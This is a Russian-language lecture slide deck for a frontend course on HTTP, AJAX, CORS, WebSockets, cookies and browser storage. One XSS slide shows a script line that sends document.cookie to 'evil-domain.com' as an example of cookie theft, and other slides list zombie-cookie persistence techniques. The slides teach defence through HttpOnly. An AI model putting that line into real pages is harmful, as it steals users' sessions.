<!DOCTYPE HTML>
<html lang="ru">
<head>
    <title>III. Отладка и мобильный веб</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=792, user-scalable=no">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <link rel="stylesheet" href="../../shower/themes/tech-mail/styles/screen.css">

    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.4/styles/default.min.css">
    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.4/highlight.min.js"></script>
</head>
<body class="list">

    <header class="caption">
        <h1>VII. Сетевое асинхронное взаимодествие</h1>
        <p>AJAX</p>
    </header>

    <section class="slide title">
        <h2>
            <span>Сетевое взаимодействие</span>
        </h2>
    </section>

    <section class="slide">
        <h2>Uniform resource locator</h2>
        <div>
            <pre>
                <code>scheme://domain:port/path?query_string#fragment_id</code>
                <div class="next">
                    <code>location.protocol <mark class="comment">/* "scheme:" */</mark></code>
                    <code>location.hostname <mark class="comment">/* "domain" */</mark></code>
                    <code>location.port <mark class="comment">/* "port" */</mark></code>
                    <code>location.pathname <mark class="comment">/* "/path" */</mark></code>
                    <code>location.search <mark class="comment">/* "?query_string" */</mark></code>
                    <code>location.hash <mark class="comment">/* "#fragment_id" */</mark></code>
                </div>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>HyperText Transfer Protocol</h2>
        <div>
            <pre>
                <code>ПРОТОКОЛ ПРИКЛАДНОГО УРОВНЯ (7-ОЙ УРОВЕНЬ OSI)</code>
                <code>КЛИЕНТ (ЗАПРОС) — СЕРВЕР (ОТВЕТ)</code>
                <code>НЕ ХРАНИТ СОСТОЯНИЕ МЕЖДУ ЗАПРОСАМИ</code>
                <code>ПРОСТ В РЕАЛИЗАЦИИ</code>
                <code>РАСШИРЯЕМЫЙ</code>
                <code>РАСПРОСТРАНЕННЫЙ</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>OSI</h2>
        <div>
            <pre>
                <code>ФИЗИЧЕСКИЙ (СРЕДА, СИГНАЛЫ, КОДЫ)</code>
                <code>КАНАЛЬНЫЙ (ФИЗИЧЕСКАЯ АДРЕСАЦИЯ)</code>
                <code>СЕТЕВОЙ (ЛОГИЧЕСКАЯ АДРЕСАЦИЯ, МАРШРУТИЗАЦИЯ)</code>
                <code>ТРАНСПОРТНЫЙ (НАДЕЖНОСТЬ)</code>
                <code>СЕАНСОВЫЙ (СЕССИИ)</code>
                <code>ПРЕДСТАВИТЕЛЬСКИЙ (СЖАТИЕ, ШИФРОВАНИЕ)</code>
                <code>ПРИКЛАДНОЙ (ДОСТУП К ДАННЫМ)</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>HTTP</h2>
        <div>
            <pre>
                <code>1991 HTTP/0.9</code>
                <code>1996 HTTP/1.0</code>
                <code>1999 HTTP/1.1</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Структура протокола</h2>
        <div>
            <pre>
                <code>СТАРТОВАЯ СТРОКА <mark class="comment">// &gt;= HTTP/0.9</mark></code>
                <code>ЗАГОЛОВКИ <mark class="comment">// &gt;= HTTP/1.0</mark></code>
                <code>ТЕЛО СООБЩЕНИЯ <mark class="comment">// &gt;= HTTP/1.0</mark></code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>http://mail.ru/</h2>
        <div>
            <pre>
                <code>GET / HTTP/1.1</code>
                <code>Host: mail.ru</code>
                <code>Accept: text/html,application/xhtml+xml,…</code>
                <code>Connection: keep-alive</code>
                <code>Accept-Encoding: gzip,deflate,sdch</code>
                <code>Accept-Language: en-US,en;q=0.8,ru;q=0.6</code>
                <code>User-Agent: Mozilla/5.0 … Safari/537.36</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>http://mail.ru/</h2>
        <div>
            <pre>
                <code>HTTP/1.1 200 OK</code>
                <code>Date: Sun, 16 Feb 2014 22:09:34 GMT</code>
                <code>Server: Apache/1.3.27 (Unix) …</code>
                <code>Content-Encoding: gzip</code>
                <code>Connection: close</code>
                <code>Cache-Control: no-cache,no-store,must-revalidate</code>
                <code>…</code>
            </pre>
        </div>
    </div></section>

    <section class="slide">
        <h2>Connection: keep-alive VS close</h2>
        <div style="top: 100px;">
            <img src="../../pics/http_connection.svg" alt="" width="800" />
        </div>
    </div></section>

    <section class="slide">
        <h2>http://mail.ru/</h2>
        <div>
            <pre>
                <code>…</code>
                <code>Content-Length: 50316</code>
                <code>Content-Type: text/html; charset=utf-8</code>
                <code> </code>
                <code>&lt;!DOCTYPE html&gt;…</code>
            </pre>
        </div>
    </div></section>

    <section class="slide">
        <h2>Методы</h2>
        <div>
            <pre>
                <code>GET <mark class="comment">// ЗАПРОС ДАННЫХ</mark></code>
                <code>POST <mark class="comment">// ПЕРЕДАЧА ДАННЫХ</mark></code>
                <code>PATCH <mark class="comment">// ЧАСТИЧНОЕ ОБНОВЛЕНИЕ РЕСУРСА </mark></code>
                <code>PUT <mark class="comment">// ЗАГРУЗКА СОДЕРЖИМОГО ЗАПРОСА</mark></code>
                <code>DELETE <mark class="comment">// УДАЛЕНИЕ РЕСУРСА</mark></code>
                <code>HEAD <mark class="comment">// ПОЛУЧЕНИЕ ТОЛЬКО ЗАГОЛОВКОВ</mark></code>
                <code>OPTIONS <mark class="comment">// ОПРЕДЕЛЕНИЕ ВОЗМОЖНОСТЕЙ СЕРВЕРА</mark></code>
                <code>…</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Коды ответов</h2>
        <div>
            <pre>
                <code>ИНФОРМАЦИОННЫЕ <mark class="comment">// 1xx</mark></code>
                <code>УСПЕШНЫЕ <mark class="comment">// 2xx</mark></code>
                <code>ПЕРЕНАПРАВЛЕНИЕ <mark class="comment">// 3xx</mark></code>
                <code>ОШИБКА КЛИЕНТА <mark class="comment">// 4xx</mark></code>
                <code>ОШИБКА СЕРВЕРА <mark class="comment">// 5xx</mark></code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Коды ответов 20x–30x</h2>
        <div>
            <pre>
                <code>200 <mark class="comment">// OK</mark></code>
                <code>301 <mark class="comment">// Moved Permanently</mark></code>
                <code>302 <mark class="comment">// Moved Temporarily</mark></code>
                <code>304 <mark class="comment">// Not Modified</mark></code>
            </pre>
        </div>
    </div></section>

    <section class="slide">
        <h2>Коды ответов 4xx</h2>
        <div>
            <pre>
                <code>400 <mark class="comment">// Bad Request</mark></code>
                <code>401 <mark class="comment">// Unauthorized</mark></code>
                <code>403 <mark class="comment">// Forbidden</mark></code>
                <code>404 <mark class="comment">// Not Found</mark></code>
                <code>405 <mark class="comment">// Method Not Allowed</mark></code>
                <code>414 <mark class="comment">// Request-URI Too Large</mark></code>
            </pre>
        </div>
    </div></section>

    <section class="slide">
        <h2>Коды ответов 5xx</h2>
        <div>
            <pre>
                <code>500 <mark class="comment">// Internal Server Error</mark></code>
                <code>502 <mark class="comment">// Bad Gateway</mark></code>
                <code>503 <mark class="comment">// Service Unavailable</mark></code>
                <code>504 <mark class="comment">// Gateway Timeout</mark></code>
            </pre>
        </div>
    </div></section>

    <section class="slide shout"><div>
        <h2>AJAX = Asynchronous JavaScript + XML</h2>
    </section>

    <section class="slide">
        <h2>AJAX</h2>
        <div>
            <figure>
                <blockquote>
                    <p><strong>AJAX</strong> — подход к построению интерактивных пользовательских интерфейсов веб-приложений, заключающийся в «фоновом» обмене данными браузера с веб-сервером.</p>
                </blockquote>
                <figcaption><a href="http://ru.wikipedia.org/wiki/AJAX">Википедия</a></figcaption>
            </figure>
        </div>
    </section>

    <section class="slide">
        <h2>PROs</h2>
        <div>
            <pre>
                <code>ЭКОНОМИЯ ТРАФИКА</code>
                <code>СНИЖЕНИЕ НАГРУЗКИ НА СЕРВЕР-САЙД</code>
                <code>УСКОРЕНИЕ РЕАКЦИИ ИНТЕРФЕЙСА</code>
                <code>ИНТЕРАКТИВНЫЕ ВОЗМОЖНОСТИ</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>CONs</h2>
        <div>
            <pre>
                <code>ТРУДНОСТИ ИНДЕКСИРОВАНИЯ</code>
                <code>УСЛОЖНЕНИЕ РАЗРАБОТКИ</code>
                <code>ТРЕБУЕТСЯ JAVASCRIPT</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Способы</h2>
        <div>
            <pre>
                <code><a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest">XMLHttpRequest</a></code>
                <code>JSONP</code>
                <code>IFRAME</code>
                <code>CORS</code>
                <code>WebSockets</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2><code>XMLHttpRequest</code></h2>
        <div>
            <pre>
                <code>var xhr = new XMLHttpRequest();</code>
                <code class="next">xhr.open("GET", "http://mail.ru/", true);</code>
                <code class="next">xhr.send(null);</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2><code>XMLHttpRequest</code></h2>
        <div>
            <pre>
                <code>xhr.onreadystatechange = function (e) {</code>
                <code>    <mark class="comment">/* e.target === xhr; */</mark></code>
                <code>    if (xhr.readyState === 4) {</code>
                <code>        if (xhr.status === 200) {</code>
                <code>            alert(xhr.responseText);</code>
                <code>        }</code>
                <code>    }</code>
                <code>};</code>
            </pre>
            <!-- DEMO -->
        </div>
    </section>

    <section class="slide">
        <h2><code>readyState</code></h2>
        <div>
            <pre>
                <code>0 <mark class="comment">/* UNSENT — до open() */</mark></code>
                <code>1 <mark class="comment">/* OPENED — до send() */</mark></code>
                <code>2 <mark class="comment">/* HEADERS_RECEIVED — данные еще не получены */</mark></code>
                <code>3 <mark class="comment">/* LOADING — данные начали поступать */</mark></code>
                <code>4 <mark class="comment">/* DONE — данные получены */</mark></code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2><code>xhr.readyState === 4</code></h2>
        <div>
            <pre>
                <code>xhr.status <mark class="comment">/* Number */</mark></code>
                <code>xhr.responseText <mark class="comment">/* String */</mark></code>
                <code>xhr.responseXML <mark class="comment">/* XMLDocument */</mark></code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>
            <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Same_origin_policy_for_JavaScript">Same-origin policy</a>
        </h2>
        <div>
            <pre>
                <code>https://e.mail.ru/messages/inbox/ <mark class="comment">(ORIGIN)</mark></code>
                <code class="next">https://e.mail.ru/compose/ <mark class="comment">(SAME-ORIGIN)</mark></code>
                <code class="next"><mark class="important">http</mark>://e.mail.ru/compose/ <mark class="comment">(CROSS-ORIGIN)</mark></code>
                <code class="next">https://e.mail.ru:<mark class="important">8080</mark>/compose/ <mark class="comment">(CROSS-ORIGIN)</mark></code>
                <code class="next">https://<mark class="important">news</mark>.mail.ru/ <mark class="comment">(CROSS-ORIGIN)</mark></code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2><a href="http://www.json-p.org">JSONP</a></h2>
        <div>
            <pre>
                <code>&lt;script&gt;</code>
                <code>    function resultHnd(json) {</code>
                <code>        <mark class="comment">/* json */</mark></code>
                <code>    }</code>
                <code>&lt;/script&gt;</code>
                <div class="next">
                    <code>&lt;script src="http://example.com/users/?cb=resultHnd"&gt;</code>
                    <code>&lt;/script&gt;</code>
                </div>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>JSONP</h2>
        <div>
            <pre>
                <code><mark class="comment">&gt;</mark> GET /users/?cb=resultHnd HTTP/1.0</code>
                <code><mark class="comment">&lt;</mark> resultHnd({ … });</code>
            <div class="next">
                <code> </code>
                <code><mark class="comment">&gt;</mark> GET /users/?cb=resultHndN HTTP/1.0</code>
                <code><mark class="comment">&lt;</mark> resultHndN({ … });</code>
            </div>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>IFRAME (SAME-ORIGIN)</h2>
        <div>
            <pre>
                <code>&lt;iframe name="req" src="javascript:false"</code>
                <code>    style="display:none"&gt;&lt;/iframe&gt;</code>
                <div class="next">
                    <code>&lt;script&gt;</code>
                    <code>    function resultHnd(json) {</code>
                    <code>        <mark class="comment">/* json */</mark></code>
                    <code>    }</code>
                    <code>&lt;/script&gt;</code>
                </div>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>IFRAME (SAME-ORIGIN)</h2>
        <div>
            <pre>
                <code>&lt;form action="/ifecho" method="post" target="req"&gt;</code>
                <code>    &lt;input type="hidden" name="cb" value="resultHnd" /&gt;</code>
                <code>    &lt;input type="text" name="msg" value="Hello" /&gt;</code>
                <code>&lt;/form&gt;</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>IFRAME (SAME-ORIGIN)</h2>
        <div>
            <pre>
                <code><mark class="comment">&gt;</mark> POST /ifecho HTTP/1.0</code>
                <code><mark class="comment">&gt;</mark> …</code>
                <code> </code>
                <code><mark class="comment">&lt;</mark> &lt;script&gt;</code>
                <code><mark class="comment">&lt;</mark>     window.parent.resultHnd({ … });</code>
                <code><mark class="comment">&lt;</mark> &lt;/script&gt;</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>IFRAME (CROSS-ORIGIN)</h2>
        <div>
            <pre>
                <code><mark class="comment">&gt;</mark> POST /ifecho HTTP/1.0</code>
                <code><mark class="comment">&gt;</mark> …</code>
                <code> </code>
                <code><mark class="comment">&lt;</mark> &lt;script&gt;</code>
                <code><mark class="comment">&lt;</mark>     <s>window.parent.resultHnd({ … });</s></code>
                <code><mark class="comment">&lt;</mark> &lt;/script&gt;</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>IFRAME (CROSS-ORIGIN)</h2>
        <div>
            <pre>
                <code><mark class="comment">&gt;</mark> POST /ifecho HTTP/1.0</code>
                <code><mark class="comment">&gt;</mark> …</code>
                <code> </code>
                <code><mark class="comment">&lt;</mark> &lt;script&gt;</code>
                <code><mark class="comment">&lt;</mark>     window.parent.postMessage("resultHnd:{ … }", "*");</code>
                <code><mark class="comment">&lt;</mark> &lt;/script&gt;</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>IFRAME (CROSS-ORIGIN)</h2>
        <div>
            <pre>
                <code>IFRAME <mark class="comment">(ДЛЯ ЗАГРУЗКИ)</mark> + </code>
                <code>    JSONP <mark class="comment">(ДЛЯ ОТСЛЕЖИВАНИЯ СТАТУСА)</mark></code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Cross-Origin Resource Sharing</h2>
        <div>
            <pre>
                <code><mark class="comment">/* Origin: tech-mail.ru */</mark></code>
                <code>var xhr = new XMLHttpRequest();</code>
                <code>xhr.onreadystatechange = function (e) { };</code>
                <code>xhr.open("GET", "http://mail.ru/", true);</code>
                <code>xhr.send(null);</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Cross-Origin Resource Sharing</h2>
        <div>
            <pre>
                <code><mark class="comment">&gt;</mark> GET / HTTP/1.1</code>
                <code><mark class="comment">&gt;</mark> Host: mail.ru</code>
                <code><mark class="comment">&gt;</mark> Referer: http://tech-mail.ru/</code>
                <code><mark class="comment">&gt;</mark> Origin: http://tech-mail.ru/</code>
                <code><mark class="comment">&gt;</mark> User-Agent: Mozilla/5.0 …</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Cross-Origin Resource Sharing</h2>
        <div>
            <pre>
                <code><mark class="comment">&lt;</mark> HTTP/1.1 200 OK</code>
                <code><mark class="comment">&lt;</mark> Content-Type: text/html; charset=utf-8</code>
                <code><mark class="comment">&lt;</mark> Content-Length: 201474</code>
                <code><mark class="comment">&lt;</mark> …</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Cross-Origin Resource Sharing</h2>
        <div>
            <pre>
                <code>XMLHttpRequest cannot load http://mail.ru/.</code>
                <code>No 'Access-Control-Allow-Origin' header is present</code>
                <code>on the requested resource. Origin 'http://tech-mail.ru'</code>
                <code>is therefore not allowed access.</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Cross-Origin Resource Sharing</h2>
        <div>
            <pre>
                <code><mark class="comment">&lt;</mark> HTTP/1.1 200 OK</code>
                <code><mark class="comment">&lt;</mark> Access-Control-Allow-Origin: *</code>
                <code><mark class="comment">&lt;</mark> Content-Type: text/html; charset=utf-8</code>
                <code><mark class="comment">&lt;</mark> Content-Length: 201474</code>
                <code><mark class="comment">&lt;</mark> …</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>CORS With Credentials</h2>
        <div>
            <pre>
                <code><mark class="comment">/* Origin: tech-mail.ru */</mark></code>
                <code>var xhr = new XMLHttpRequest();</code>
                <code>xhr.withCredentials = true;</code>
                <code> </code>
                <code><mark class="comment">&lt;</mark> Access-Control-Allow-Origin: http://tech-mail.ru</code>
                <code><mark class="comment">&lt;</mark> Access-Control-Allow-Credentials: true</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Comet</h2>
        <div>
            <figure>
                <blockquote>
                    <p><strong>Comet</strong> — любая модель работы веб-приложения, при которой постоянное HTTP-соединение позволяет веб-серверу отправлять (push) данные браузеру без дополнительного запроса со стороны браузера.</p>
                </blockquote>
                <figcaption><a href="http://ru.wikipedia.org/wiki/Comet_(%D0%BF%D1%80%D0%BE%D0%B3%D1%80%D0%B0%D0%BC%D0%BC%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5)">Википедия</a></figcaption>
            </figure>
        </div>
    </section>

    <section class="slide">
        <h2>Comet</h2>
        <div>
            <pre>
                <code><a href="https://learn.javascript.ru/xhr-longpoll#частые-опросы">Short polling</a></code>
                <code><a href="https://learn.javascript.ru/xhr-longpoll#длинные-опросы">Long polling</a></code>
                <code><a href="http://www.w3.org/TR/websockets/">WebSockets</a></code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Поддержка WebSockets</h2>
        <div>
            <pre>
                <code>Chrome 16 &amp; Chrome for Android 16</code>
                <code>Firefox 11</code>
                <code>Internet Explorer 10</code>
                <code>Opera 12.10</code>
                <code>Safari 6.0 &amp; Safari Mobile 6.0</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Особенности WebSockets</h2>
        <div>
            <pre>
                <code>Upgrades from HTTP 1.1</code>
                <code>Cross-Origin Resource Sharing (CORS)</code>
                <code>Message-based</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Использование WebSockets</h2>
        <div>
            <pre>
                <code>var connection = new WebSocket('ws://example.com/echo');</code>
                <code>connection.onopen = function () { … };</code>
                <code>connection.onerror = function (error) { … };</code>
                <code>connection.onmessage = function (e) { <mark class="comment">/* e.data */</mark> };</code>
                <code>connection.send(msg);</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>RESTful</h2>
        <div>
            <ul>
                <li>Клиент-серверная архитектура</li>
                <li>Независимость от состояния</li>
                <li>Кэшируемая архитектура</li>
                <li>Многоуровневая архитектура</li>
                <li>Единый интерфейс сервера</li>
            </ul>
        </div>
    </section>

    <section class="slide">
        <h2>Backbone</h2>
        <div>
            <pre>
                <code>model.fetch(); <mark class="comment">// GET</mark></code>
                <code>model.save(); <mark class="comment">// POST, PUT, PATCH</code></li>
                <code>model.destroy(); <mark class="comment">// DELETE</mark></code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Backbone.sync</h2>
        <div>
            <pre>
                <code>var methodMap = {</code>
                <code>    'create': 'POST',</code>
                <code>    'update': 'PUT',</code>
                <code>    'patch':  'PATCH',</code>
                <code>    'delete': 'DELETE',</code>
                <code>    'read':   'GET'</code>
                <code>};</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Model</h2>
        <div>
            <pre>
                <code>var Model = Backbone.Model.extend({</code>
                <code>    url: 'auth',</code>
                <div class="next">
                    <code>    sync: apiSync</code>
                </div>
                <code>});</code>
                <code>var model = new Model();</code>
                <code>model.fetch();</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>api/sync.js</h2>
        <div>
            <pre>
                <code>define(function(){</code>
                <code>    return function(method, model, options){</code>
                <code>        <mark class="comment">// TODO</mark></code>
                <code>    }</code>
                <code>});</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Домашнее задание</h2>
        <div>
            <pre>
                <code>ВЗАИМОДЕЙСТВИЕ С СЕРВЕРОМ С ПОМОЩЬЮ AJAX</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Подготовка</h2>
        <div>
            <pre>
                <code>$ git remote add tp \</code>
                <code>→ https://github.com/eprev/frontend-stub.git</code>
                <code>$ git remote update</code>
                <code>$ git merge tp/v4</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Разрешаем конфикты</h2>
        <div>
            <pre>
                <code>$ git status</code>
                <code>$ git add …</code>
                <code>$ git commit -m "Fix merge conflicts"</code>
                <code>$ grunt</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Запускаем</h2>
        <div>
            <pre>
                <code>$ npm install</code>
                <code>$ grunt</code>
            </pre>
        </div>
    </section>

    <!-- Рекомендованная леитература к лекции 7 "Сетевое взаимодействие" -->
    <section class="slide">
        <h2>Что почитать, посмотреть?</h2>
        <div>
        <h3>Почитать:</h3>
        <ol>
            <li>
                <img alt="en" src="../../pics/en.gif">
                <a href="http://www.tutorialspoint.com/http/http_quick_guide.htm">HTTP - Quick Guide</a>
            </li>
            <li>
                <img alt="habr" src="../../pics/habr.png">
                <a href="http://habrahabr.ru/post/245145/">Выразительный JavaScript: HTTP</a>
            </li>
        </ol>
        <h3>Посмотреть:</h3>
        <ol>
            <li>
                <img alt="en" src="../../pics/en.gif">
                <a href="https://www.udacity.com/course/ud110">Intro to AJAX. Making Asynchronous Requests with jQuery</a>
            </li>
        </ol>
        </div>
    </section>

    <header class="caption">
        <h1>VIII. Хранение данных</h1>
        <p>Cookies, localStorage, JSON.</p>
    </header>

    <section class="slide title">
        <h2>
            <span>Хранение данных</span>
        </h2>
    </section>

    <section class="slide shout">
        <h2>
            HTTP is a stateless protocol
        </h2>
    </section>

    <section class="slide shout">
        <h2>
            Cookies
        </h2>
    </section>

    <section class="slide">
        <h2>Cookies</h2>
        <div>
            <figure>
                <blockquote>
                    <p><strong>Куки</strong> — небольшой фрагмент данных, отправленный веб-сервером и хранимый на компьютере пользователя. Веб-клиент (обычно веб-браузер) всякий раз при попытке открыть страницу соответствующего сайта пересылает этот фрагмент данных веб-серверу в виде HTTP-запроса.</p>
                </blockquote>
                <figcaption><a href="http://ru.wikipedia.org/wiki/HTTP_cookie">Википедия</a></figcaption>
            </figure>
        </div>
    </section>

    <section class="slide">
        <h2>Использование</h2>
        <div>
            <pre>
                <code>АУТЕНТИФИКАЦИЯ</code>
                <code>ХРАНЕНИЕ НАСТРОЕК ПОЛЬЗОВАТЕЛЕЙ</code>
                <code>ОТСЛЕЖИВАНИЕ СЕАНСА</code>
                <code>СБОР СТАТИСТИКИ</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2><a href="http://tools.ietf.org/html/rfc2965">Спецификация</a></h2>
        <div>
            <pre>
                <code>ДО 4096 БАЙТ МИНИМУМ</code>
                <code>МИНИМУМ 20 ШТ. НА ДОМЕН</code>
                <code>МИНИМУМ 300 ШТ. ВСЕГО</code>
                <code>ИМЕНА НЕЧУВСТВИТЕЛЬНЫ К РЕГИСТРУ</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>1 Клиент → Сервер</h2>
        <div>
            <pre>
                <code>GET / HTTP/1.1</code>
                <code>Host: example.com</code>
                <code>…</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>2 Клиент ← Сервер</h2>
        <div>
            <pre>
                <code>HTTP/1.1 200 OK</code>
                <code><mark>Set-Cookie: name=value</mark></code>
                <code>Content-Type: text/html</code>
                <code>…</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>3 Клиент → Сервер</h2>
        <div>
            <pre>
                <code>GET / HTTP/1.1</code>
                <code>Host: example.com</code>
                <code><mark>Cookie: name=value</mark></code>
                <code>…</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>4 Клиент ← Сервер</h2>
        <div>
            <pre>
                <code>HTTP/1.1 200 OK</code>
                <code><mark>Set-Cookie: name=newValue</mark></code>
                <code>Content-Type: text/html</code>
                <code>…</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Set-Cookie</h2>
        <div>
            <pre>
                <code>Set-Cookie: value[; expires=date][; domain=domain]</code>
                <code>            [; path=path][; secure][; HttpOnly]</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Set-Cookie’s expires</h2>
        <div>
            <pre>
                <code>Set-Cookie: value; expires=Sat, 01 March 2014 13:21:34 GMT</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Set-Cookie’s domain</h2>
        <div>
            <pre>
                <code>Set-Cookie: value1; domain=.mail.ru</code>
            </pre>
            <pre>
                <code>Set-Cookie: value2; domain=e.mail.ru</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Set-Cookie’s path</h2>
        <div>
            <pre>
                <code>Set-Cookie: value1; path=/</code>
            </pre>
            <pre>
                <code>Set-Cookie: value2; path=/check</code>
            </pre>
            <pre>
                <code>Set-Cookie: value3; path=/checkout</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Cookie ID</h2>
        <div>
            <pre>
                <code>Set-Cookie: name=value1; domain=.example.com; path=/</code>
                <code>Set-Cookie: name=value2; domain=www.example.com; path=/</code>
                <code>Set-Cookie: name=value3; domain=.example.com; path=/archive</code>
            </pre>
            <pre>
                <code>Cookie: name=value1; name=value2; name=value3</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>JavaScript</h2>
        <div>
            <pre>
                <code>document.cookie; <mark class="comment">/* "name=newValue" */</mark></code>
                <code class="next">document.cookie = "name2=value";</code>
                <code class="next">document.cookie; <mark class="comment">/* "name=newValue; name2=value" */</mark></code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2><a href="http://en.wikipedia.org/wiki/Cross-site_scripting">Cross Site Scripting</a> (XSS)</h2>
        <div>
            <pre>
                <code>(new Image()).src = "http://evil-domain.com/?cookie=" +</code>
                <code>                    document.cookie;</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>HttpOnly</h2>
        <div>
            <pre>
                <code>Set-Cookie: name1=value;</code>
                <code>Set-Cookie: name2=value; HttpOnly</code>
            </pre>
            <pre>
                <code>document.cookie; <mark class="comment">/* "name1=value" */</mark></code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Zombie Cookie</h2>
        <div>
            <img style="float:left" src="../../pics/storage/Zombie_Cookie.png">
            <p>
                <strong>What are Zombie Cookies?</strong>
                <br>
                A zombie cookie is an HTTP cookie that returns to life automatically after being deleted by the user.
            </p>
        </div>
    </section>

    <section class="slide">
        <h2>Zombie Cookie</h2>
        <div>
            <ul>
                <li>Storing cookies in and reading out web history</li>
                <li>Storing cookies in HTTP ETags</li>
                <li>Internet Explorer userData storage   (starting IE9, userData is no longer supported)</li>
                <li>HTML5 Storage</li>
                <li>Storing cookies in RGB values of auto-generated, force-cached PNGs using HTML5 Canvas tag to read pixels (cookies) back out</li>
                <li>Local Shared Objects (Flash cookies)</li>
                <li>Silverlight Isolated Storage</li>
            </ul>
        </div>
    </section>

    <section class="slide">
        <h2>HSTS Cookie</h2>
        <div>
            <a href="https://github.com/ben174/hsts-cookie">https://github.com/ben174/hsts-cookie</a>
        </div>
    </section>




    <section class="slide shout">
        <h2>
            localStorage / sessionStorage
        </h2>
    </section>

    <section class="slide">
        <h2><code>window.localStorage</code></h2>
        <div>
            <pre>
                <code>localStorage[key]; <mark class="comment">/* String */</mark></code>
                <code>localStorage[key] = value; <mark class="comment">/* String */</mark></code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2><code>window.localStorage</code></h2>
        <div>
            <pre>
                <code>localStorage.length</code>
                <code>localStorage.key(i)<mark class="comment">/* String */</mark></code>
                <code>localStorage.getItem(key) <mark class="comment">/* String */</mark></code>
                <code>localStorage.setItem(key, value)</code>
                <code>localStorage.removeItem(key)</code>
                <code>localStorage.clear()</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>Событие <code>storage</code></h2>
        <div>
            <pre>
                <code>window.addEventListener("storage", function (e) {</code>
                <code>    <mark class="comment">/* e.key, e.newValue */</mark></code>
                <code>})</code>
            </pre>
        </div>
    </section>

    <section class="slide">
        <h2>JSON</h2>
        <div>
            <pre>
                <code>function setJSON(key, value) {</code>
                <code>    localStorage[key] = JSON.stringify(value);</code>
                <code>}</code>
                <code>function getJSON(key) {</code>
                <code>    var value = localStorage[key];</code>
                <code>    return value ? JSON.parse(value) : null;</code>
                <code>}</code>
            </pre>
        </div>
    </section>


    <section class="slide">
        <h2>WebSQL</h2>
        <div>
        <ul>
            <li>Know SQL? You can use WebSQL</li>
            <li>"Mini" file-based database (SQLite) in your browser</li>
            <li>You can open a database, run SQL, even use transactions</li>
            <li>Asynchronous</li>
            <li><a href="http://www.w3.org/TR/webdatabase/">Spec</a></li>
        </ul>
        </div>
    </section>

    <section class="slide">
        <h2>WebSQL - Possible Uses?</h2>
        <div>
            <ul>
                <li>Storing a <i>lot</i> of content</li>
                <li>Storing content you want to search</li>
            </ul>
        </div>
    </section>

    <section class="slide">
        <h2>WebSQL - How Many/How Big?</h2>
        <div>
            <ul>
                <li>5 megs</li>
                <li>User may be prompted for more</li>
            </ul>
        </div>
    </section>

    <section class="slide">
        <h2>WebSQL - FYI</h2>
        <div>
        <ul>
            <li>Chrome Dev Tools (view/edit)</li>
            <li>And yeah - run arbitrary SQL</li>
        </ul>
        </div>
    </section>

    <section class="slide">
        <h2>WebSQL - When can I use it?</h2>
        <div>
            <a href="http://caniuse.com/sql-storage/embed">http://caniuse.com/sql-storage/embed</a>
        </div>
